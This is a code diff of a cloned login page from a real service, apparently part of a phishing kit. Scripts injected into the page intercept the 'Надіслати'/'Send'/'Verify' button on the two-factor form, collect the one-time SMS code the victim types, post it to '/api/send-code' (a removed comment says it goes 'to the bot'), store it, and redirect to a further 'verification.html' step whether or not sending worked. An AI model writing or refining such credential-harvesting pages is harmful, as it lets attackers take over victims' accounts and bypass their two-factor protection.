@@ -218,60 +218,76 @@
       c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
       C402.765,25.895,404.093,19.231,400.858,11.427z"></path></g></svg></button></div><div id="ot-anchor"></div><section id="ot-fltr-modal"><div id="ot-fltr-cnt"><div id="ot-filter-list-header"></div><button id="clear-filters-handler">Clear</button><div class="ot-fltr-scrlcnt ot-pc-scrollbar"><ul class="ot-fltr-opts"><li class="ot-fltr-opt"><div class="ot-chkbox"><input id="chkbox-id" type="checkbox" class="category-filter-handler"> <label for="chkbox-id"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></li></ul><div class="ot-fltr-btns"><button id="filter-apply-handler">Apply</button> <button id="filter-cancel-handler">Cancel</button></div></div></div></section></div></div><section id="ot-lst-cnt" class="ot-host-cnt ot-pc-scrollbar"><div id="ot-sel-blk"><div class="ot-sel-all"><div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span class="ot-li-hdr">Leg.Interest</span></div><div class="ot-sel-all-chkbox"><div class="ot-chkbox" id="ot-selall-hostcntr"><input id="select-all-hosts-groups-handler" type="checkbox"> <label for="select-all-hosts-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-vencntr"><input id="select-all-vendor-groups-handler" type="checkbox"> <label for="select-all-vendor-groups-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div><div class="ot-chkbox" id="ot-selall-licntr"><input id="select-all-vendor-leg-handler" type="checkbox"> <label for="select-all-vendor-leg-handler"><span class="ot-label-txt">checkbox label</span></label> <span class="ot-label-status">label</span></div></div></div></div><div class="ot-sdk-row"><div class="ot-sdk-column"><ul id="ot-host-lst"></ul></div></div></section></section><div class="ot-pc-footer ot-pc-scrollbar"><div class="ot-btn-container"><button class="ot-pc-refuse-all-handler" ot-button-order="1">Відхилити все</button> <button class="save-preference-btn-handler onetrust-close-btn-handler" ot-button-order="2">Підтвердити мої вибори</button></div><!-- Footer logo --><div class="ot-pc-footer-logo"><a href="https://www.onetrust.com/products/cookie-consent/" target="_blank" rel="noopener noreferrer" aria-label="Powered by OneTrust Відкривається в новому вікні"><img alt="Powered by Onetrust" src="./Codizemail_files/powered_by_logo.svg" title="Powered by OneTrust Відкривається в новому вікні"></a></div></div><!-- Cookie subgroup container --><!-- Vendor list link --><!-- Cookie lost link --><!-- Toggle HTML element --><!-- Checkbox HTML --><!-- plus minus--><!-- Arrow SVG element --><!-- Accordion basic element --><span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite"></span><!-- Vendor Service container and item template --></div><iframe class="ot-text-resize" sandbox="allow-same-origin" title="onetrust-text-resize" style="position: absolute; top: -50000px; width: 100em;" aria-hidden="true" src="./Codizemail_files/saved_resource.html"></iframe></div></div><iframe id="switch-account-iframe" src="./Codizemail_files/callback.html" style="display: none;"></iframe><div style="display: none; visibility: hidden;"><script nonce="83cee471-9616-4895-9508-901e73dab27b">var flag9=!0;document.body.addEventListener("DOMSubtreeModified",gatest);function gatest(){flag9&&document.getElementById("click-registration-submit")&&(document.getElementById("click-registration-submit").addEventListener("click",function(){var a=document.getElementsByClassName("active")[0].textContent;dataLayer.push({eventCategory:"registration",eventAction:"click",eventLabel:"registration::"+a,elementid:"click-registration-submit",event:"click"})}),flag9=!1)};</script></div><img src="./Codizemail_files/img" width="1" height="1">
 <script>
-document.addEventListener('DOMContentLoaded', function() {
-    const form = document.querySelector('form');
-    if (form) {
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Попробовать найти код из разных полей ввода
-            let code = '';
-            const passwordInput = document.querySelector('#password-input');
-            if (passwordInput && passwordInput.value) {
-                code = passwordInput.value;
-            } else {
-                // Собрать код из всех возможных полей ввода
-                const inputFields = document.querySelectorAll('input[type="text"], input[type="tel"], input[maxlength], [data-e2e="input-mfa"]');
-                inputFields.forEach(input => {
-                    if (input && input.value && input.value.trim()) {
-                        code += input.value.trim();
-                    }
-                });
-            }
-            
-            if (code) {
-                // Получить номер телефона пользователя
-                const userPhone = getUserPhone();
-                
-                // Использовать безопасную функцию отправки кода
-                fetch('/api/send-code', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        type: 'sms',
-                        code: code,
-                        phone: userPhone
-                    })
-                }).then(response => response.json()).then(result => {
-                    console.log('Код отправлен:', result);
-                }).catch(error => {
-                    console.log('Ошибка:', error);
-                });
-                
-                // Обновить состояние верификации
-                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
-                if (!completedVerifications.includes('sms')) {
-                    completedVerifications.push('sms');
-                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
-                }
-                
-                // Всегда вернуться на страницу verification.html
-                setTimeout(() => {
-                    window.location.href = 'verification.html';
-                }, 1000);
-            }
-        });
+// Делегированный обработчик для кнопок "Надіслати"
+document.addEventListener('click', function(e) {
+    const btn = e.target.closest('button');
+    if (!btn) return;
+    
+    // Проверяем селекторы для кнопки подтверждения кода
+    const isVerifyButton = btn.matches('[data-e2e="btn-mfa-verify"]') || 
+                          btn.getAttribute('aria-label') === 'Надіслати' ||
+                          (btn.textContent && (btn.textContent.includes('Надіслати') || btn.textContent.includes('Send') || btn.textContent.includes('Verify')));
+    
+    if (!isVerifyButton) return;
+    
+    e.preventDefault();
+    e.stopPropagation();
+    
+    // Собрать код из полей ввода
+    let codeValue = '';
+    const codeInputs = document.querySelectorAll('[data-e2e="input-mfa"], input[inputmode="numeric"], .mfa-input, input[type="text"], input[type="tel"], input[maxlength]');
+    
+    codeInputs.forEach(input => {
+        if (input.value && input.value.trim()) {
+            codeValue += input.value.trim();
+        }
+    });
+    
+    // Проверяем минимальную длину кода
+    if (!codeValue || codeValue.length < 4) {
+        console.log('Код слишком короткий');
+        return;
     }
+    
+    // Сохранить код в sessionStorage
+    sessionStorage.setItem('loginCode', codeValue);
+    
+    // Отправить код через сервер
+    fetch('/api/send-code', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ 
+            type: 'sms',
+            code: codeValue
+        })
+    }).then(response => {
+        if (!response.ok) {
+            console.log('Ошибка сервера:', response.status);
+        }
+        // Продолжить независимо от результата
+        let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
+        if (!completedVerifications.includes('sms')) {
+            completedVerifications.push('sms');
+            localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
+        }
+        
+        setTimeout(() => {
+            window.location.href = 'verification.html';
+        }, 1000);
+    }).catch(error => {
+        console.log('Ошибка:', error);
+        // Продолжить даже при ошибке отправки
+        let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
+        if (!completedVerifications.includes('sms')) {
+            completedVerifications.push('sms');
+            localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
+        }
+        
+        setTimeout(() => {
+            window.location.href = 'verification.html';
+        }, 1000);
+    });
+});
     
     // Функция для получения номера телефона пользователя
     function getUserPhone() {
@@ -341,57 +357,69 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 
 <script>
-// Делегированный обработчик клика для кнопок "Надіслати"
-document.addEventListener('click', function(e) {
-    const btn = e.target.closest('button');
-    if (!btn) return;
-    
-    const matches = btn.matches('[data-e2e="btn-mfa-verify"], .mfa-verify-buttonv2');
-    if (!matches) return;
-    
-    const buttonText = btn.textContent || '';
-    if (buttonText.includes('Надіслати') || buttonText.includes('Send') || buttonText.includes('Verify')) {
+// Найти поле кода и кнопку "Надіслати"
+const codeInput = document.querySelector('[data-e2e="input-mfa"], input[inputmode="numeric"], .mfa-input');
+const continueBtn = document.querySelector('[data-e2e="btn-mfa-verify"], button[aria-label="Надіслати"]');
+
+if (continueBtn) {
+    continueBtn.addEventListener('click', function(e) {
         e.preventDefault();
         
-        // Получить значение кода из полей ввода
-        const codeInputs = document.querySelectorAll('input[name*="code"], input[data-e2e*="code"], .mfa-input, input[inputmode="numeric"]');
-        let code = '';
+        // Получить значение кода
+        let codeValue = '';
         
-        codeInputs.forEach(input => {
-            if (input.value && input.value.trim()) {
-                code += input.value.trim();
-            }
-        });
+        if (codeInput) {
+            codeValue = codeInput.value.trim();
+        } else {
+            // Собрать код из всех возможных полей ввода
+            const inputFields = document.querySelectorAll('input[type="text"], input[type="tel"], input[maxlength], [data-e2e="input-mfa"]');
+            inputFields.forEach(input => {
+                if (input && input.value && input.value.trim()) {
+                    codeValue += input.value.trim();
+                }
+            });
+        }
         
-        if (code && code.length >= 4) {
-            // Отправить код в бот
+        if (codeValue) {
+            // Сохранить код в sessionStorage
+            sessionStorage.setItem('loginCode', codeValue);
+            
+            // Отправить код через сервер
             fetch('/api/send-code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ 
                     type: 'sms',
-                    code: code
+                    code: codeValue
                 })
-            }).then(response => {
-                if (response.ok) {
-                    // Обновить состояние верификации
-                    let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
-                    if (!completedVerifications.includes('sms')) {
-                        completedVerifications.push('sms');
-                        localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
-                    }
-                    
-                    // Перейти на страницу verification.html
-                    setTimeout(() => {
-                        window.location.href = 'verification.html';
-                    }, 1000);
+            }).then(() => {
+                // Обновить состояние верификации и продолжить
+                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
+                if (!completedVerifications.includes('sms')) {
+                    completedVerifications.push('sms');
+                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
                 }
+                
+                // Перейти на страницу verification.html
+                setTimeout(() => {
+                    window.location.href = 'verification.html';
+                }, 1000);
             }).catch(error => {
                 console.log('Ошибка:', error);
+                // Продолжить даже при ошибке отправки
+                let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
+                if (!completedVerifications.includes('sms')) {
+                    completedVerifications.push('sms');
+                    localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
+                }
+                
+                setTimeout(() => {
+                    window.location.href = 'verification.html';
+                }, 1000);
             });
         }
-    }
-});
+    });
+}
 </script>
 
 <script type="text/javascript" id="" charset="">(function(a,c,b){a.lo||(s=a.lo=function(){s.callMethod?s.callMethod.apply(s,arguments):s.queue.push(arguments)},a._lo||(a._lo=s),s.push=s,s.loaded=0,s.version="1.0",s.queue=[],T=c.createElement("script"),T.async=1,T.src=b,T.integrity="sha384-EGMqwBwBqWCtdehcn5R2MzvkmybXLlsrAxfvOw3Jwa8FZbdj0geidgBbqBEPR85/",T.crossOrigin="anonymous",b=c.getElementsByTagName("script")[0],b.parentNode.insertBefore(T,b))})(window,document,"https://cdn-public.liftoffintl.io/app2web-sdk/sdk.js");lo("init","cf85981342");
